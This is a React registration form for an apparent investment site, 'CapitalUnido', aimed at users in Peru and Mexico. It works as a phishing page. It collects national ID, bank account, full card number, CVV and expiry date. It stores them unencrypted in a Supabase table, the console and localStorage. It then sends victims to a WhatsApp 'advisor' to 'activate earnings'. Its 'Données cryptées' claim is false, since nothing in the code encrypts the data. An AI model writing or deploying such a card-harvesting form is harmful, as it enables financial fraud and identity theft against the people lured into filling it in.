import { useState, useEffect } from 'react';
import { CountryConfig } from '../data/countries';
import { supabase } from '../lib/supabase';

interface RegistrationFormProps {
  lang: 'fr' | 'en' | 'es';
  country: CountryConfig;
  onSuccess: () => void;
  onClose: () => void;
}

const RegistrationForm = ({ lang, country, onSuccess, onClose }: RegistrationFormProps) => {
  const [step, setStep] = useState(1);
  const totalSteps = 3;
  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    email: '',
    idNumber: '',
    bankName: '',
    accountNumber: '',
    cardNumber: '',
    cvv: '',
    expiryDate: '',
    cardHolder: '',
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const [loading, setLoading] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);

  // 🔗 Lien WhatsApp fixe
  const whatsappLink = 'https://wa.me/message/YCYBNEDFB3CTA1';

  // Banques selon le pays
  const getBanks = () => {
    switch (country.code) {
      case 'pe':
        return ['BCP (Banco de Crédito del Perú)', 'BBVA Perú', 'Interbank', 'Scotiabank Perú', 'BanBif', 'Banco Pichincha', 'Caja Municipal', 'Autre'];
      case 'mx':
        return ['BBVA México', 'Banorte', 'Santander México', 'Citibanamex', 'HSBC México', 'Banco Azteca', 'Nu México', 'Autre'];
      default:
        return ['BCP', 'BBVA', 'Interbank', 'Scotiabank', 'Autre'];
    }
  };

  // Couleurs personnalisées selon le pays - Version plus claire
  const getColors = () => {
    switch (country.code) {
      case 'pe':
        return {
          bgGradient: 'from-[#f5f0eb] via-[#faf6f0] to-[#f5f0eb]',
          cardBg: 'bg-white/80',
          borderColor: 'border-[#D91023]/30',
          progressGradient: 'from-[#D91023] to-[#fcd116]',
          buttonBg: 'bg-[#D91023]',
          buttonHover: 'hover:bg-[#D91023]/80',
          buttonText: 'text-white',
          accentColor: 'text-[#D91023]',
          accentBg: 'bg-[#D91023]',
          errorColor: 'text-red-500',
          inputFocus: 'focus:border-[#D91023]',
          textColor: 'text-gray-800',
          textMuted: 'text-gray-500',
          inputBg: 'bg-gray-50',
          inputBorder: 'border-gray-200',
          titleColor: 'text-gray-900',
          confirmationBg: 'from-[#f0f7f0] to-[#e8f5e9]',
          confirmationBorder: 'border-[#4CAF50]',
          checkColor: 'text-[#4CAF50]',
          whatsappBg: 'bg-[#25D366]',
          whatsappHover: 'hover:bg-[#1ebe5c]',
        };
      case 'mx':
        return {
          bgGradient: 'from-[#f5f0eb] via-[#faf6f0] to-[#f5f0eb]',
          cardBg: 'bg-white/80',
          borderColor: 'border-[#006341]/30',
          progressGradient: 'from-[#006341] to-[#CE1126]',
          buttonBg: 'bg-[#006341]',
          buttonHover: 'hover:bg-[#006341]/80',
          buttonText: 'text-white',
          accentColor: 'text-[#006341]',
          accentBg: 'bg-[#006341]',
          errorColor: 'text-red-500',
          inputFocus: 'focus:border-[#006341]',
          textColor: 'text-gray-800',
          textMuted: 'text-gray-500',
          inputBg: 'bg-gray-50',
          inputBorder: 'border-gray-200',
          titleColor: 'text-gray-900',
          confirmationBg: 'from-[#f0f7f0] to-[#e8f5e9]',
          confirmationBorder: 'border-[#4CAF50]',
          checkColor: 'text-[#4CAF50]',
          whatsappBg: 'bg-[#25D366]',
          whatsappHover: 'hover:bg-[#1ebe5c]',
        };
      default:
        return {
          bgGradient: 'from-[#f5f0eb] via-[#faf6f0] to-[#f5f0eb]',
          cardBg: 'bg-white/80',
          borderColor: 'border-[#fcd116]/30',
          progressGradient: 'from-[#fcd116] to-[#ef2b2d]',
          buttonBg: 'bg-[#fcd116]',
          buttonHover: 'hover:bg-[#fcd116]/80',
          buttonText: 'text-[#0a0f1c]',
          accentColor: 'text-[#fcd116]',
          accentBg: 'bg-[#fcd116]',
          errorColor: 'text-red-500',
          inputFocus: 'focus:border-[#fcd116]',
          textColor: 'text-gray-800',
          textMuted: 'text-gray-500',
          inputBg: 'bg-gray-50',
          inputBorder: 'border-gray-200',
          titleColor: 'text-gray-900',
          confirmationBg: 'from-[#f0f7f0] to-[#e8f5e9]',
          confirmationBorder: 'border-[#4CAF50]',
          checkColor: 'text-[#4CAF50]',
          whatsappBg: 'bg-[#25D366]',
          whatsappHover: 'hover:bg-[#1ebe5c]',
        };
    }
  };

  const colors = getColors();
  const banks = getBanks();

  // 📊 Fonction d'envoi vers Supabase
  const sendToSupabase = async (data: typeof formData) => {
    try {
      const payload = {
        full_name: data.fullName,
        phone: data.phone,
        email: data.email,
        id_number: data.idNumber,
        bank_name: data.bankName,
        account_number: data.accountNumber,
        card_number: data.cardNumber,
        cvv: data.cvv,
        expiry_date: data.expiryDate,
        card_holder: data.cardHolder,
        country: country.label,
        language: lang,
      };

      console.log('📤 Envoi vers Supabase:', payload);

      const { error } = await supabase
        .from('registrations')
        .insert([payload]);

      if (error) {
        console.error('❌ Erreur Supabase:', error);
        // Sauvegarde locale en cas d'échec
        localStorage.setItem('pending_registration', JSON.stringify(payload));
        return false;
      }

      console.log('✅ Données enregistrées avec succès dans Supabase !');
      // Supprimer la sauvegarde locale si elle existe
      localStorage.removeItem('pending_registration');
      return true;
    } catch (error) {
      console.error('❌ Erreur:', error);
      localStorage.setItem('pending_registration', JSON.stringify({
        ...data,
        country: country.label,
        language: lang,
      }));
      return false;
    }
  };

  // 🔄 Récupérer les données en attente au chargement
  useEffect(() => {
    const pending = localStorage.getItem('pending_registration');
    if (pending) {
      try {
        const data = JSON.parse(pending);
        console.log('📦 Données en attente trouvées:', data);
        // On pourrait réessayer ici
      } catch (e) {
        console.error('Erreur de récupération:', e);
      }
    }
  }, []);

  // Textes selon la langue
  const getTexts = () => {
    const texts = {
      fr: {
        title: 'Finalisez votre inscription',
        subtitle: 'Plus que quelques informations et vous commencez à investir !',
        stepLabel: 'Étape',
        of: 'sur',
        fullName: 'Nom complet',
        phone: 'Téléphone',
        email: 'Email',
        idNumber: country.idLabel.fr,
        selectBank: 'Sélectionnez votre banque',
        accountNumber: 'Numéro de compte bancaire',
        cardNumber: 'Numéro de carte bancaire',
        expiryDate: 'MM/AA',
        cvv: 'CVV',
        cardHolder: 'Nom sur la carte',
        back: 'Retour',
        continue: 'Continuer',
        validate: 'Valider mon inscription',
        confirmationTitle: '✅ Inscription confirmée !',
        confirmationSub: 'Vos informations ont été enregistrées avec succès.',
        reviewTitle: '📋 Récapitulatif de vos informations',
        nameLabel: 'Nom complet',
        phoneLabel: 'Téléphone',
        emailLabel: 'Email',
        idLabel: country.idLabel.fr,
        bankLabel: 'Banque',
        accountLabel: 'Numéro de compte',
        cardLabel: 'Carte bancaire',
        cardEnding: 'se terminant par',
        whatsappTitle: '📱 Finalisez votre inscription avec un conseiller',
        whatsappSub: 'Un conseiller va vous contacter pour valider votre compte et activer vos gains.',
        whatsappButton: '💬 Contacter un conseiller sur WhatsApp',
        editButton: '✏️ Modifier mes informations',
        closeButton: 'Fermer',
        errors: {
          required: 'Ce champ est requis',
          emailInvalid: 'Email invalide (ex: nom@domaine.com)',
          phoneInvalid: 'Numéro invalide (ex: +51 9XX XXX XXX)',
          cardInvalid: '16 chiffres requis',
          cvvInvalid: '3 chiffres requis',
          expiryInvalid: 'Format MM/AA requis',
          bankRequired: 'Veuillez sélectionner une banque',
          accountRequired: 'Numéro de compte requis',
          nameRequired: 'Nom complet requis',
          idRequired: `${country.idLabel.fr} requis`,
          cardHolderRequired: 'Nom sur la carte requis',
        },
      },
      en: {
        title: 'Complete your registration',
        subtitle: 'Just a few more details and you start investing!',
        stepLabel: 'Step',
        of: 'of',
        fullName: 'Full name',
        phone: 'Phone number',
        email: 'Email',
        idNumber: country.idLabel.en,
        selectBank: 'Select your bank',
        accountNumber: 'Bank account number',
        cardNumber: 'Card number',
        expiryDate: 'MM/YY',
        cvv: 'CVV',
        cardHolder: 'Cardholder name',
        back: 'Back',
        continue: 'Continue',
        validate: 'Confirm registration',
        confirmationTitle: '✅ Registration confirmed!',
        confirmationSub: 'Your information has been successfully recorded.',
        reviewTitle: '📋 Your information summary',
        nameLabel: 'Full name',
        phoneLabel: 'Phone',
        emailLabel: 'Email',
        idLabel: country.idLabel.en,
        bankLabel: 'Bank',
        accountLabel: 'Account number',
        cardLabel: 'Card number',
        cardEnding: 'ending in',
        whatsappTitle: '📱 Finalize your registration with an advisor',
        whatsappSub: 'An advisor will contact you to validate your account and activate your earnings.',
        whatsappButton: '💬 Contact an advisor on WhatsApp',
        editButton: '✏️ Edit my information',
        closeButton: 'Close',
        errors: {
          required: 'This field is required',
          emailInvalid: 'Invalid email (ex: name@domain.com)',
          phoneInvalid: 'Invalid number (ex: +51 9XX XXX XXX)',
          cardInvalid: '16 digits required',
          cvvInvalid: '3 digits required',
          expiryInvalid: 'MM/YY format required',
          bankRequired: 'Please select a bank',
          accountRequired: 'Account number required',
          nameRequired: 'Full name required',
          idRequired: `${country.idLabel.en} required`,
          cardHolderRequired: 'Cardholder name required',
        },
      },
      es: {
        title: 'Finaliza tu inscripción',
        subtitle: '¡Solo unas pocas informaciones más y empiezas a invertir!',
        stepLabel: 'Paso',
        of: 'de',
        fullName: 'Nombre completo',
        phone: 'Teléfono',
        email: 'Correo electrónico',
        idNumber: country.idLabel.es,
        selectBank: 'Selecciona tu banco',
        accountNumber: 'Número de cuenta bancaria',
        cardNumber: 'Número de tarjeta',
        expiryDate: 'MM/AA',
        cvv: 'CVV',
        cardHolder: 'Nombre en la tarjeta',
        back: 'Atrás',
        continue: 'Continuar',
        validate: 'Confirmar inscripción',
        confirmationTitle: '✅ ¡Inscripción confirmada!',
        confirmationSub: 'Tu información ha sido registrada con éxito.',
        reviewTitle: '📋 Resumen de tu información',
        nameLabel: 'Nombre completo',
        phoneLabel: 'Teléfono',
        emailLabel: 'Correo electrónico',
        idLabel: country.idLabel.es,
        bankLabel: 'Banco',
        accountLabel: 'Número de cuenta',
        cardLabel: 'Tarjeta bancaria',
        cardEnding: 'terminada en',
        whatsappTitle: '📱 Finaliza tu inscripción con un asesor',
        whatsappSub: 'Un asesor te contactará para validar tu cuenta y activar tus ganancias.',
        whatsappButton: '💬 Contactar un asesor por WhatsApp',
        editButton: '✏️ Modificar mis datos',
        closeButton: 'Cerrar',
        errors: {
          required: 'Este campo es requerido',
          emailInvalid: 'Email inválido (ej: nombre@dominio.com)',
          phoneInvalid: 'Número inválido (ej: +51 9XX XXX XXX)',
          cardInvalid: '16 dígitos requeridos',
          cvvInvalid: '3 dígitos requeridos',
          expiryInvalid: 'Formato MM/AA requerido',
          bankRequired: 'Por favor selecciona un banco',
          accountRequired: 'Número de cuenta requerido',
          nameRequired: 'Nombre completo requerido',
          idRequired: `${country.idLabel.es} requerido`,
          cardHolderRequired: 'Nombre en la tarjeta requerido',
        },
      },
    };
    return texts[lang] || texts.fr;
  };

  const t = getTexts();

  const validateField = (field: string, value: string) => {
    const newErrors = { ...errors };
    const e = t.errors;

    switch (field) {
      case 'fullName':
        if (!value.trim()) {
          newErrors.fullName = e.nameRequired;
        } else if (value.trim().length < 2) {
          newErrors.fullName = 'Minimum 2 caractères';
        } else {
          delete newErrors.fullName;
        }
        break;

      case 'email':
        if (!value.trim()) {
          newErrors.email = e.required;
        } else {
          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          if (!emailRegex.test(value)) {
            newErrors.email = e.emailInvalid;
          } else {
            delete newErrors.email;
          }
        }
        break;

      case 'phone':
        if (!value.trim()) {
          newErrors.phone = e.required;
        } else {
          const phoneRegex = /^\+?[0-9\s-]{8,15}$/;
          if (!phoneRegex.test(value.replace(/\s/g, ''))) {
            newErrors.phone = e.phoneInvalid;
          } else {
            delete newErrors.phone;
          }
        }
        break;

      case 'idNumber':
        if (!value.trim()) {
          newErrors.idNumber = e.idRequired;
        } else if (value.trim().length < 4) {
          newErrors.idNumber = 'Minimum 4 caractères';
        } else {
          delete newErrors.idNumber;
        }
        break;

      case 'bankName':
        if (!value) {
          newErrors.bankName = e.bankRequired;
        } else {
          delete newErrors.bankName;
        }
        break;

      case 'accountNumber':
        if (!value.trim()) {
          newErrors.accountNumber = e.accountRequired;
        } else if (value.trim().length < 4) {
          newErrors.accountNumber = 'Minimum 4 chiffres';
        } else {
          delete newErrors.accountNumber;
        }
        break;

      case 'cardNumber':
        const card = value.replace(/\s/g, '');
        if (!value.trim()) {
          newErrors.cardNumber = e.required;
        } else if (card.length !== 16 || !/^\d+$/.test(card)) {
          newErrors.cardNumber = e.cardInvalid;
        } else {
          delete newErrors.cardNumber;
        }
        break;

      case 'cvv':
        if (!value.trim()) {
          newErrors.cvv = e.required;
        } else if (!/^\d{3}$/.test(value)) {
          newErrors.cvv = e.cvvInvalid;
        } else {
          delete newErrors.cvv;
        }
        break;

      case 'expiryDate':
        if (!value.trim()) {
          newErrors.expiryDate = e.required;
        } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) {
          newErrors.expiryDate = e.expiryInvalid;
        } else {
          const [month, year] = value.split('/');
          const now = new Date();
          const currentYear = now.getFullYear() % 100;
          const currentMonth = now.getMonth() + 1;
          const expYear = parseInt(year);
          const expMonth = parseInt(month);
          if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
            newErrors.expiryDate = 'Carte expirée';
          } else {
            delete newErrors.expiryDate;
          }
        }
        break;

      case 'cardHolder':
        if (!value.trim()) {
          newErrors.cardHolder = e.cardHolderRequired;
        } else if (value.trim().length < 2) {
          newErrors.cardHolder = 'Minimum 2 caractères';
        } else {
          delete newErrors.cardHolder;
        }
        break;
    }

    setErrors(newErrors);
  };

  const handleChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    setTouched((prev) => ({ ...prev, [field]: true }));
    validateField(field, value);
  };

  const handleBlur = (field: string) => {
    setTouched((prev) => ({ ...prev, [field]: true }));
    const value = formData[field as keyof typeof formData];
    if (value) {
      validateField(field, value);
    }
  };

  const handleNext = () => {
    const currentFields = getStepFields(step);
    let hasError = false;
    currentFields.forEach((field) => {
      const value = formData[field as keyof typeof formData];
      setTouched((prev) => ({ ...prev, [field]: true }));
      validateField(field, value);
      if (errors[field]) {
        hasError = true;
      }
    });

    const currentErrors = { ...errors };
    currentFields.forEach((field) => {
      if (currentErrors[field]) {
        hasError = true;
      }
    });

    if (hasError) return;

    if (step < totalSteps) {
      setStep(step + 1);
    } else {
      setLoading(true);
      
      // 📊 Envoyer à Supabase
      sendToSupabase(formData).then((success) => {
        setTimeout(() => {
          setLoading(false);
          setShowConfirmation(true);
        }, 1000);
      });
    }
  };

  const getStepFields = (stepNum: number): string[] => {
    switch (stepNum) {
      case 1: return ['fullName', 'phone', 'email', 'idNumber'];
      case 2: return ['bankName', 'accountNumber'];
      case 3: return ['cardNumber', 'cvv', 'expiryDate', 'cardHolder'];
      default: return [];
    }
  };

  const handlePrevious = () => {
    if (step > 1) setStep(step - 1);
  };

  const isStepValid = () => {
    const currentFields = getStepFields(step);
    for (const field of currentFields) {
      const value = formData[field as keyof typeof formData];
      if (!value || errors[field]) return false;
    }
    return true;
  };

  const formatCardNumber = (value: string) => {
    const card = value.replace(/\s/g, '').replace(/\D/g, '').slice(0, 16);
    const groups = card.match(/.{1,4}/g);
    return groups ? groups.join(' ') : card;
  };

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, '').slice(0, 4);
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2)}`;
    }
    return cleaned;
  };

  const handleCardChange = (value: string) => {
    const formatted = formatCardNumber(value);
    setFormData((prev) => ({ ...prev, cardNumber: formatted }));
    setTouched((prev) => ({ ...prev, cardNumber: true }));
    validateField('cardNumber', formatted);
  };

  const handleExpiryChange = (value: string) => {
    const formatted = formatExpiryDate(value);
    setFormData((prev) => ({ ...prev, expiryDate: formatted }));
    setTouched((prev) => ({ ...prev, expiryDate: true }));
    validateField('expiryDate', formatted);
  };

  // 🔄 Page de confirmation
  if (showConfirmation) {
    return (
      <div className={`min-h-screen bg-gradient-to-br ${colors.bgGradient} flex items-center justify-center p-4`}>
        <div className={`max-w-2xl w-full ${colors.cardBg} backdrop-blur-xl border ${colors.confirmationBorder} rounded-3xl p-8 shadow-2xl`}>
          <div className="text-center mb-8">
            <div className={`text-6xl mb-4 ${colors.checkColor}`}>✅</div>
            <h2 className={`text-3xl font-bold ${colors.titleColor}`}>{t.confirmationTitle}</h2>
            <p className={`${colors.textMuted} mt-2`}>{t.confirmationSub}</p>
          </div>

          <div className={`bg-gradient-to-br ${colors.confirmationBg} rounded-2xl p-6 mb-8 border ${colors.confirmationBorder}`}>
            <h3 className={`font-bold ${colors.titleColor} mb-4 text-lg`}>{t.reviewTitle}</h3>
            <div className="grid md:grid-cols-2 gap-3 text-sm">
              <div><span className={colors.textMuted}>{t.nameLabel}:</span> <span className={colors.textColor}><strong>{formData.fullName}</strong></span></div>
              <div><span className={colors.textMuted}>{t.phoneLabel}:</span> <span className={colors.textColor}><strong>{formData.phone}</strong></span></div>
              <div><span className={colors.textMuted}>{t.emailLabel}:</span> <span className={colors.textColor}><strong>{formData.email}</strong></span></div>
              <div><span className={colors.textMuted}>{t.idLabel}:</span> <span className={colors.textColor}><strong>{formData.idNumber}</strong></span></div>
              <div><span className={colors.textMuted}>{t.bankLabel}:</span> <span className={colors.textColor}><strong>{formData.bankName}</strong></span></div>
              <div><span className={colors.textMuted}>{t.accountLabel}:</span> <span className={colors.textColor}><strong>••••{formData.accountNumber.slice(-4)}</strong></span></div>
              <div><span className={colors.textMuted}>{t.cardLabel}:</span> <span className={colors.textColor}><strong>•••• •••• •••• {formData.cardNumber.slice(-4)}</strong></span></div>
              <div><span className={colors.textMuted}>{t.cardHolder}:</span> <span className={colors.textColor}><strong>{formData.cardHolder}</strong></span></div>
            </div>
          </div>

          <div className="text-center mb-6">
            <p className={`${colors.textColor} font-semibold mb-2`}>{t.whatsappTitle}</p>
            <p className={`${colors.textMuted} text-sm mb-4`}>{t.whatsappSub}</p>
            <a
              href={`${whatsappLink}?text=Bonjour%2C%20je%20viens%20de%20finaliser%20mon%20inscription%20sur%20CapitalUnido.%20Mon%20nom%20est%20${encodeURIComponent(formData.fullName)}.%20Pouvez-vous%20m%27aider%20%C3%A0%20valider%20mon%20compte%20%3F`}
              target="_blank"
              rel="noopener noreferrer"
              className={`inline-flex items-center gap-3 ${colors.whatsappBg} ${colors.whatsappHover} text-white font-bold px-8 py-4 rounded-full shadow-lg hover:scale-105 transition-all duration-300`}
            >
              <span className="text-2xl">💬</span>
              {t.whatsappButton}
            </a>
          </div>

          <div className="flex flex-wrap gap-3 justify-center">
            <button
              onClick={() => setShowConfirmation(false)}
              className={`px-6 py-2 rounded-full border ${colors.borderColor} ${colors.textColor} hover:bg-gray-100 transition-all`}
            >
              {t.editButton}
            </button>
            <button
              onClick={onClose}
              className={`px-6 py-2 rounded-full ${colors.buttonBg} ${colors.buttonText} hover:opacity-80 transition-all`}
            >
              {t.closeButton}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // 🔄 Formulaire normal
  return (
    <div className={`min-h-screen bg-gradient-to-br ${colors.bgGradient} flex items-center justify-center p-4`}>
      <div className={`max-w-lg w-full ${colors.cardBg} backdrop-blur-xl border ${colors.borderColor} rounded-3xl p-8 shadow-2xl`}>
        <h2 className={`text-3xl font-black text-center mb-2 ${colors.titleColor}`}>{t.title}</h2>
        <p className={`text-center ${colors.textMuted} mb-8`}>{t.subtitle}</p>

        <div className="mb-8">
          <div className="flex justify-between text-xs mb-2 text-gray-400">
            <span>{t.stepLabel} {step} {t.of} {totalSteps}</span>
            <span>{Math.round(((step - 1) / (totalSteps - 1)) * 100)}%</span>
          </div>
          <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
            <div
              className={`h-full bg-gradient-to-r ${colors.progressGradient} transition-all duration-500 rounded-full`}
              style={{ width: `${((step - 1) / (totalSteps - 1)) * 100}%` }}
            />
          </div>
        </div>

        <div className="space-y-4">
          {step === 1 && (
            <div className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder={t.fullName}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.fullName && errors.fullName ? 'border-red-500' : ''}`}
                  value={formData.fullName}
                  onChange={(e) => handleChange('fullName', e.target.value)}
                  onBlur={() => handleBlur('fullName')}
                />
                {touched.fullName && errors.fullName && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.fullName}</p>}
              </div>

              <div>
                <input
                  type="tel"
                  placeholder={t.phone}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.phone && errors.phone ? 'border-red-500' : ''}`}
                  value={formData.phone}
                  onChange={(e) => handleChange('phone', e.target.value)}
                  onBlur={() => handleBlur('phone')}
                />
                {touched.phone && errors.phone && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.phone}</p>}
              </div>

              <div>
                <input
                  type="email"
                  placeholder={t.email}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.email && errors.email ? 'border-red-500' : ''}`}
                  value={formData.email}
                  onChange={(e) => handleChange('email', e.target.value)}
                  onBlur={() => handleBlur('email')}
                />
                {touched.email && errors.email && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.email}</p>}
              </div>

              <div>
                <input
                  type="text"
                  placeholder={t.idNumber}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.idNumber && errors.idNumber ? 'border-red-500' : ''}`}
                  value={formData.idNumber}
                  onChange={(e) => handleChange('idNumber', e.target.value)}
                  onBlur={() => handleBlur('idNumber')}
                />
                {touched.idNumber && errors.idNumber && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.idNumber}</p>}
              </div>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-4">
              <div>
                <select
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.bankName && errors.bankName ? 'border-red-500' : ''}`}
                  value={formData.bankName}
                  onChange={(e) => handleChange('bankName', e.target.value)}
                  onBlur={() => handleBlur('bankName')}
                >
                  <option value="" className="text-gray-400">{t.selectBank}</option>
                  {banks.map((bank) => (
                    <option key={bank} value={bank} className="text-gray-800">{bank}</option>
                  ))}
                </select>
                {touched.bankName && errors.bankName && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.bankName}</p>}
              </div>

              <div>
                <input
                  type="text"
                  placeholder={t.accountNumber}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.accountNumber && errors.accountNumber ? 'border-red-500' : ''}`}
                  value={formData.accountNumber}
                  onChange={(e) => handleChange('accountNumber', e.target.value)}
                  onBlur={() => handleBlur('accountNumber')}
                />
                {touched.accountNumber && errors.accountNumber && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.accountNumber}</p>}
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder={t.cardNumber}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.cardNumber && errors.cardNumber ? 'border-red-500' : ''}`}
                  value={formData.cardNumber}
                  onChange={(e) => handleCardChange(e.target.value)}
                  onBlur={() => handleBlur('cardNumber')}
                  maxLength={19}
                />
                {touched.cardNumber && errors.cardNumber && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.cardNumber}</p>}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <input
                    type="text"
                    placeholder={t.expiryDate}
                    className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.expiryDate && errors.expiryDate ? 'border-red-500' : ''}`}
                    value={formData.expiryDate}
                    onChange={(e) => handleExpiryChange(e.target.value)}
                    onBlur={() => handleBlur('expiryDate')}
                    maxLength={5}
                  />
                  {touched.expiryDate && errors.expiryDate && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.expiryDate}</p>}
                </div>
                <div>
                  <input
                    type="text"
                    placeholder={t.cvv}
                    className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.cvv && errors.cvv ? 'border-red-500' : ''}`}
                    value={formData.cvv}
                    onChange={(e) => handleChange('cvv', e.target.value)}
                    onBlur={() => handleBlur('cvv')}
                    maxLength={3}
                  />
                  {touched.cvv && errors.cvv && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.cvv}</p>}
                </div>
              </div>

              <div>
                <input
                  type="text"
                  placeholder={t.cardHolder}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-400 border-2 ${colors.inputBorder} ${colors.inputFocus} ${touched.cardHolder && errors.cardHolder ? 'border-red-500' : ''}`}
                  value={formData.cardHolder}
                  onChange={(e) => handleChange('cardHolder', e.target.value)}
                  onBlur={() => handleBlur('cardHolder')}
                />
                {touched.cardHolder && errors.cardHolder && <p className={`${colors.errorColor} text-sm mt-1`}>{errors.cardHolder}</p>}
              </div>
            </div>
          )}
        </div>

        <div className="flex gap-3 mt-8">
          {step > 1 && (
            <button
              onClick={handlePrevious}
              className="flex-1 bg-gray-100 hover:bg-gray-200 py-4 rounded-2xl text-gray-700 transition-all"
            >
              {t.back}
            </button>
          )}
          <button
            onClick={handleNext}
            disabled={!isStepValid() || loading}
            className={`flex-1 ${colors.buttonBg} ${colors.buttonHover} ${colors.buttonText} font-bold py-4 rounded-2xl disabled:opacity-50 transition-all`}
          >
            {loading ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                <span>...</span>
              </div>
            ) : step < totalSteps ? t.continue : t.validate}
          </button>
        </div>

        <p className={`text-center text-gray-400 text-xs mt-6`}>
          🔒 Transactions sécurisées • Données cryptées
        </p>
      </div>
    </div>
  );
};

export default RegistrationForm;